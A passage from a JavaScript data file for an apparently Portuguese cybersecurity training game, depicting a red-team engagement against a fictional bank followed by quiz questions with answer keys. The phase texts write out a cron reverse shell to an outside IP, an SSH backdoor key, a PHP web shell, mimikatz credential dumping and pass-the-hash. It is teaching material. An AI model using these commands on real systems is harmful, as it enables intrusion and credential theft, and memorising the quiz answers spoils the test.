-> ROOT via sudo find (GTFOBins)!`,

      "/home/redteam/fase4_persistencia.txt": `# FASE 4 -- PERSISTENCIA (Horas 24-32)
# Kill Chain: Installation (maintaining access)

=== BACKDOOR SSH (mais sigiloso) ===
echo "ssh-rsa AAAAB3NzaC1... redteam@kali" >> /root/.ssh/authorized_keys
-> ssh -i redteam_key root@200.100.50.99 funciona mesmo apos reboot

=== CRON JOB REVERSO (reconexao automatica) ===
(crontab -l; echo "0 * * * * bash -i >& /dev/tcp/200.100.1.100/4445 0>&1") | crontab -
-> Reconexao a cada hora automaticamente

=== WEB SHELL (acesso via HTTP) ===
echo '<?php if(isset($_GET["c"])){system($_GET["c"]);} ?>' > /var/www/html/.sys.php
-> http://200.100.50.20/.sys.php?c=id funciona como backdoor

=== OBRIGACOES ETICAS EM PENTEST ===
  DOCUMENTAR todos os backdoors instalados (tipo, local, data)
  REMOVER todos ao final do engajamento
  NUNCA deixar backdoors em producao apos conclusao do teste
  Relatorio deve listar TODOS os acessos persistentes criados`,

      "/home/redteam/fase5_lateral.txt": `# FASE 5 -- MOVIMENTO LATERAL (Horas 32-48)
# Kill Chain: Command & Control + Lateral Movement

=== PIVOTING PARA REDE INTERNA ===
# old-server esta conectado a rede interna 10.10.10.0/24!
# Criar tunnel SSH SOCKS5 para pivotar:

ssh -i redteam_key -D 9050 root@200.100.50.99
# Cria proxy SOCKS5 local na porta 9050

# Acessar rede interna via proxychains:
proxychains nmap -sT -p 22,80,443,3306,1433 10.10.10.0/24

Hosts internos descobertos:
  10.10.10.10  -- Windows Server 2019 (Domain Controller)
  10.10.10.20  -- Windows Server 2016 (File Server)
  10.10.10.30  -- SQL Server 2019 (Database)

=== PASS-THE-HASH NO WINDOWS ===
# Extrair hashes NTLM do Windows comprometido (via carlos.admin):
mimikatz# sekurlsa::logonpasswords
  Username: carlos.admin
  NTLM: 32ed87bdb5fdc5e9cba88547376818d4

# Mover lateralmente com o hash (sem precisar da senha em texto):
proxychains impacket-smbexec FINSECURE/carlos.admin@10.10.10.10 \\
  -hashes :32ed87bdb5fdc5e9...
-> Shell no Domain Controller como carlos.admin!`,

      "/home/redteam/fase6_exfiltracao.txt": `# FASE 6 -- EXFILTRACAO SIMULADA (Horas 48-64)
# Kill Chain: Actions on Objectives

=== OBJETIVO: PROVAR ACESSO A DADOS CRITICOS ===
# Exfiltracao real de dados em pentest = PROIBIDO sem autorizacao especifica
# Em vez disso: evidenciar que o acesso ERA possivel

# No SQL Server interno (via tunnel):
proxychains sqlcmd -S 10.10.10.30 -U sa -P 'Senha@123'
1> SELECT COUNT(*) FROM FinSecure_Core.dbo.clientes
2> GO
-> 2.347.819 registros de clientes identificados

# Capturar apenas schema e contagem -- NAO exfiltrar dados reais:
1> SELECT TOP 0 * FROM clientes  <- apenas estrutura, sem dados
2> GO
Colunas: id, nome, cpf, saldo, conta, agencia, ...

=== IMPACTO SE FOSSE ATAQUE REAL ===
-> 2.3M clientes expostos (LGPD -- dado financeiro = categoria especial)
-> Notificacao BACEN obrigatoria (Resolucao BCB 85/2021)
-> Notificacao ANPD em 72h (LGPD Art. 48)
-> Multa LGPD: ate 2% do faturamento, limitado a R$ 50M por infracao

=== CLEANUP OBRIGATORIO ===
  OK SSH authorized_keys revertido
  OK Crontab limpo
  OK Web shell .sys.php deletado
  OK Todos os acessos documentados no relatorio`,

      "/home/redteam/relatorio_executivo.txt": `# RELATORIO EXECUTIVO -- RED TEAM
# FinSecure Bank S.A. | Operacao Shadow
# Duracao: 72h | Red Team: 3 analistas
# Data: 2024-02-12 a 2024-02-15

RESULTADO: COMPROMETIMENTO TOTAL DO AMBIENTE
Objetivo atingido: acesso ao Domain Controller e dados de 2.3M clientes.

ACHADOS CRITICOS (CVSS >= 8.0):
+---+------------------------------+-------+
|  #| Vulnerabilidade              | CVSS  |
+---+------------------------------+-------+
| 1 | Jupyter sem autenticacao     | 10.0  |
| 2 | Apache 2.4.49 CVE-2021-41773 |  9.8  |
| 3 | Credenciais SQL fracas       |  9.1  |
| 4 | sudo NOPASSWD python/find    |  8.8  |
| 5 | Script cron com perm. 0777   |  8.8  |
| 6 | Spear phishing bem-sucedido  |  8.5  |
| 7 | Domain Controller acessivel  |  9.0  |
+---+------------------------------+-------+

KILL CHAIN:
  OK Recon: OSINT revelou Jupyter e Apache vulneraveis
  OK Acesso: 3 vetores simultaneos (Jupyter, CVE-41773, Phishing)
  OK Escalada: root em 2 servidores via sudo/GTFOBins
  OK Persistencia: SSH backdoor + cron reverso (removidos apos teste)
  OK Lateral: Domain Controller via Pass-the-Hash + pivoting SSH
  OK Objetivo: acesso confirmado a 2.3M registros de clientes

PLANO DE REMEDIACAO:
  Semana 1: Patch Apache, auth no Jupyter, corrigir sudo NOPASSWD
  Mes 1: MFA em todos os acessos, segmentacao DMZ/interna
  Mes 3: EDR em endpoints, SIEM, treinamento anti-phishing`,
    },
    perguntas: [
      {
        id: 1,
        texto: "A Fase 1 usa theHarvester e Shodan ANTES do nmap ativo. Por que o reconhecimento passivo é realizado primeiro?",
        opcoes: [
          { id: "a", texto: "O reconhecimento passivo é mais preciso do que ferramentas ativas como nmap" },
          { id: "b", texto: "Reconhecimento passivo não gera tráfego no alvo — coleta inteligência sem alertar IDS/SIEM/SOC, definindo o escopo antes de qualquer ação potencialmente detectável" },
          { id: "c", texto: "Shodan e theHarvester são mais rápidas que nmap" },
          { id: "d", texto: "O contrato sempre exige reconhecimento passivo primeiro como cláusula legal" }
        ],
        correta: "b",
        pontos: 60,
        feedback_correto: "Estratégia de red team correta! Reconhecimento passivo: zero tráfego para o alvo — Shodan consulta bancos de dados públicos, theHarvester busca em fontes abertas. Benefícios: (1) invisível para o SOC do alvo — sem alertas no SIEM, (2) revela ativos esquecidos que o próprio alvo não sabe que estão expostos (servidor old, Jupyter aberto), (3) define a superfície de ataque antes de expor nossa presença com varreduras ativas. Red teams profissionais passam dias em OSINT antes do primeiro pacote.",
        feedback_errado: "Reconhecimento passivo (OSINT) não gera nenhum tráfego direto para o alvo. Shodan indexa a internet de forma independente, theHarvester consulta fontes públicas. Isso é crítico em red team: o alvo não sabe que está sendo estudado, o SOC não recebe alertas, e você descobre ativos esquecidos (servidor old com Jupyter aberto) que seriam ignorados em uma varredura ativa com escopo definido previamente."
      },
      {
        id: 2,
        texto: "A Fase 4 instala backdoors (SSH, cron, web shell). O que é OBRIGATÓRIO ao finalizar o engajamento de red team em relação a esses backdoors?",
        opcoes: [
          { id: "a", texto: "Manter os backdoors ativos para o cliente verificar as vulnerabilidades por conta própria" },
          { id: "b", texto: "Documentar TODOS os backdoors no relatório E removê-los completamente — o cliente confirma a remoção antes de encerrar o contrato" },
          { id: "c", texto: "Entregar as credenciais dos backdoors somente ao CISO por canal criptografado" },
          { id: "d", texto: "Backdoors temporários expiram automaticamente — não precisam de ação manual" }
        ],
        correta: "b",
        pontos: 60,
        feedback_correto: "Obrigação ética e contratual fundamental! Backdoors de pentest: (1) DOCUMENTAR — relatório lista cada backdoor: tipo, localização exata, data de instalação, data de remoção, (2) REMOVER TODOS — sem exceção, ao final do engajamento, (3) VERIFICAR — cliente ou equipe interna confirma remoção. Backdoors não removidos: risco de segurança real para o cliente, responsabilidade legal para o red team, e potencial violação do contrato.",
        feedback_errado: "Todo backdoor instalado em um pentest/red team deve ser: (1) DOCUMENTADO — localização exata, tipo, data de instalação e remoção, (2) REMOVIDO completamente ao final — sem exceções, (3) VERIFICADO pelo cliente. Backdoors não removidos viram vulnerabilidades reais que podem ser exploradas por atacantes externos, além de gerar responsabilidade legal para a empresa de segurança que fez o teste."
      },
      {
        id: 3,
        texto: "A Fase 5 usa tunnel SSH (-D 9050) + proxychains para pivotar do old-server para a rede interna 10.10.10.0/24. O que o pivoting permite?",
        opcoes: [
          { id: "a", texto: "Executar os ataques com maior velocidade por usar a rede interna" },
          { id: "b", texto: "Acessar recursos da rede interna (Domain Controller, SQL Server) que não estão expostos à internet — usando o servidor comprometido como proxy/relay entre o atacante e a rede interna" },
          { id: "c", texto: "Evitar que logs sejam gerados no servidor comprometido" },
          { id: "d", texto: "Usar ferramentas de ataque que não funcionam via internet" }
        ],
        correta: "b",
        pontos: 60,
        feedback_correto: "Pivoting é o coração do movimento lateral! O Domain Controller (10.10.10.10) e SQL Server (10.10.10.30) estão na rede interna — sem rota da internet. Mas old-server está em ambas as redes (DMZ + interna). SSH -D 9050 cria um proxy SOCKS5: todo tráfego via proxychains é tunelado pelo old-server para a rede interna. Por isso segmentação de rede é crítica: a DMZ jamais deve ter conectividade direta com a rede de produção interna.",
        feedback_errado: "Pivoting usa um host comprometido como relay: old-server está na DMZ (acessível da internet) E conectado à rede interna. SSH -D cria proxy SOCKS5 local — todo tráfego via proxychains passa pelo old-server e alcança a rede interna onde residem o DC e o banco de dados. Sem pivoting: esses sistemas são inacessíveis. Com pivoting: a segmentação de rede é contornada via o host comprometido. Prevenção: DMZ sem rota para rede interna."
      },
      {
        id: 4,
        texto: "A Fase 6 identifica 2.3M registros de clientes mas NÃO os exfiltra. Por que um pentest ético NUNCA deve exfiltrar dados reais de clientes?",
        opcoes: [
          { id: "a", texto: "Porque os dados são grandes demais para transferir durante o teste" },
          { id: "b", texto: "Exfiltrar dados reais viola a LGPD (tratamento sem base legal), cria responsabilidade penal para o red team, expõe clientes reais a risco adicional — evidências de que o acesso ERA possível são suficientes" },
          { id: "c", texto: "Para não deixar rastros excessivos nos logs do servidor" },
          { id: "d", texto: "O contrato proíbe transferência de arquivos grandes" }
        ],
        correta: "b",
        pontos: 60,
        feedback_correto: "Fundamento legal e ético essencial! Exfiltrar dados reais em pentest: (1) LGPD — tratamento de dados pessoais sem finalidade legítima é ilegal; pentest não autoriza o red team a processar dados de clientes do cliente, (2) Lei 12.737/2012 — mesmo com autorização parcial, exfiltração não autorizada de dados pode gerar responsabilidade penal, (3) Risco adicional real — dados saindo do ambiente criam mais um ponto de exposição. Suficiente: COUNT(*) + estrutura da tabela = prova sem risco adicional.",
        feedback_errado: "Exfiltrar dados de clientes é proibido por: (1) LGPD Art. 7 — tratamento de dados pessoais exige base legal, e o contrato de pentest autoriza o teste de segurança, não o processamento de dados pessoais dos clientes, (2) risco adicional para o cliente — dados saindo do ambiente = mais exposição, (3) desnecessário — COUNT(*) e estrutura da tabela provam o acesso sem copiar dados reais. O relatório descreve o impacto potencial, não o causa."
      },
      {
        id: 5,
        texto: "O relatório prioriza remediações em Semana 1, Mês 1 e Mês 3. Por que Jupyter sem auth e Apache CVE são 'Semana 1' enquanto EDR é 'Mês 3'?",
        opcoes: [
          { id: "a", texto: "Por ordem alfabética das tecnologias envolvidas" },
          { id: "b", texto: "Priorização por CVSS e facilidade de exploração: Jupyter (CVSS 10, qualquer pessoa tem RCE em 30 segundos) e Apache CVE (CVSS 9.8, exploit público) têm correção simples e risco imediato; EDR requer planejamento, orçamento e rollout corporativo complexo" },
          { id: "c", texto: "EDR é uma tecnologia opcional e os outros são obrigatórios por lei" },
          { id: "d", texto: "Semana 1 só cobre softwares gratuitos — EDR é uma solução paga" }
        ],
        correta: "b",
        pontos: 60,
        feedback_correto: "Risk-Based Vulnerability Management perfeito! Critérios de priorização: (1) CVSS score, (2) facilidade de exploração — exploit público? Requer autenticação? (3) esforço de correção. Jupyter sem auth: CVSS 10.0, exploit = abrir o browser e digitar Python, correção = adicionar senha ou tirar da internet (2 minutos). Apache: patch = apt upgrade apache2 (5 minutos). EDR: solução corporativa complexa, meses de planejamento, piloto, deployment. Alto risco + correção simples = Semana 1.",
        feedback_errado: "Priorização correta usa: CVSS + facilidade de exploração + esforço de correção. Jupyter: CVSS 10.0, qualquer pessoa tem RCE em 30 segundos, correção em 2 minutos → Semana 1. Apache CVE-2021-41773: CVSS 9.8, exploit público amplamente disponível, patch = uma atualização → Semana 1. EDR: projeto corporativo complexo, meses de planejamento e deployment, treinamento de equipe → Mês 3. Alto risco + correção simples = prioridade máxima."
      }
    ],
    conclusao: {
      o_que_aconteceu: "Red Team de 72h comprometeu toda a infraestrutura da FinSecure Bank: 3 vetores de acesso inicial independentes (Jupyter sem auth, CVE-2021-41773, spear phishing), escalada para root em 2 servidores, pivoting SSH para rede interna, acesso ao Domain Controller via Pass-the-Hash, e identificação de 2.3M registros de clientes sem exfiltração real.",
      vulnerabilidade: "Kill chain completa executada: OSINT revelou ativos críticos esquecidos, 3 vetores de acesso inicial garantiram redundância operacional, escalada de privilégios via misconfigurações clássicas (sudo, cron, SUID), e segmentação de rede insuficiente permitiu pivoting do DMZ para rede de produção interna.",
      risco: "Comprometimento total: root em servidores, Domain Admin no Active Directory, e acesso a dados de 2.3M clientes. Impacto regulatório potencial: notificação BACEN (Res. BCB 85/2021), notificação ANPD em 72h (LGPD Art. 48), multas LGPD até R$50M, dano reputacional crítico para instituição financeira.",
      como_corrigir: "Semana 1: remover Jupyter da internet, patch Apache 2.4.51+, corrigir sudo NOPASSWD, fixar permissões de scripts cron. Mês 1: MFA obrigatório em todos os acessos privilegiados, segmentação DMZ/rede interna com firewall stateful, treinamento intensivo anti-phishing. Mês 3: EDR em todos os endpoints, SIEM com detecção de anomalias e correlação de eventos, programa de red team exercises trimestrais.",
      boa_pratica: "Red Team vs Pentest: Pentest testa vulnerabilidades específicas com escopo técnico definido. Red Team simula adversário real end-to-end com objetivos de negócio (comprometer o DC, acessar dados de clientes). Frameworks: MITRE ATT&CK (mapa de táticas e técnicas de adversários reais), PTES (Penetration Testing Execution Standard), TIBER-EU (framework de red team para setor financeiro). Certificações: OSCP (Offensive Security Certified Professional), CRTO (Certified Red Team Operator), eCPTX. Regra de ouro: a autorização formal e o scope document são o que separa o red teamer do criminoso — sem eles, é o mesmo crime."
    }
  }
];

module.exports = missionsData;
